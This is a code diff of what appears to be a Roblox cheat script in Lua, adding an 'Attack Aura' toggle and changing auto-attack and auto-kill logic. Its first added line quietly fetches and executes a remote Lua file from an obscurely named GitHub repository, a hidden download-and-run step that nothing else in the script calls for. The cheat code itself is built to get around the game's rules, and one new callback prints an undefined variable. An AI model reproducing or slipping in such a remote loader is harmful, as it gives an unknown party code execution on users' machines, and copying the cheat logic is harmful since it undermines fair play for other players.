@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Doiaskqp1112ssd9ubvDm/Resportestkk/main/nofi.lua.txt"))()
 local UserInputService = game:GetService("UserInputService")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local TweenService = game:GetService("TweenService")
@@ -6118,24 +6119,33 @@ Page2.CreateToggle({
 	Name = "Fast Attack",
 	Dis = "Fast Attack",
 	Value = true,
-	Callback = function(Value)
-	_G.FastAttack = Value
+	Callback = function(v)
+	_G.FastAttack = v
 		print(v)
 	end,
 })
 
-
-    
+Page2.CreateToggle({
+	Name = "Attack Aura",
+	Dis = "Attack Near",
+	Value = true,
+	Callback = function(value)
+	_G.AttackMob = value
+		print(v)
+	end,
+})
 
     spawn(function()
         while wait(_G.FastAttackDelay) do
-            if _G.FastAttack and not _G.AutoFarmFruitMastery and not _G.AutoFarmGunMastery then
+            if _G.AttackMob and not _G.AutoFarmFruitMastery and not _G.AutoFarmGunMastery then
                 pcall(function()
                     AttackNoCD()
                 end)
             end
         end
     end)
+    
+    
     
 
 local PBlade = game.Players.LocalPlayer
@@ -9983,7 +9993,7 @@ Page5.CreateToggle({
                                      v.HumanoidRootPart.CanCollide = false
                                      topos(v.HumanoidRootPart.CFrame * Pos)
                                      AttackNoCD()
-                                     sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
+                                   --  sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                                  until not _G.AutoKillShark or not v.Parent or v.Humanoid.Health <= 0
                              end
                              end
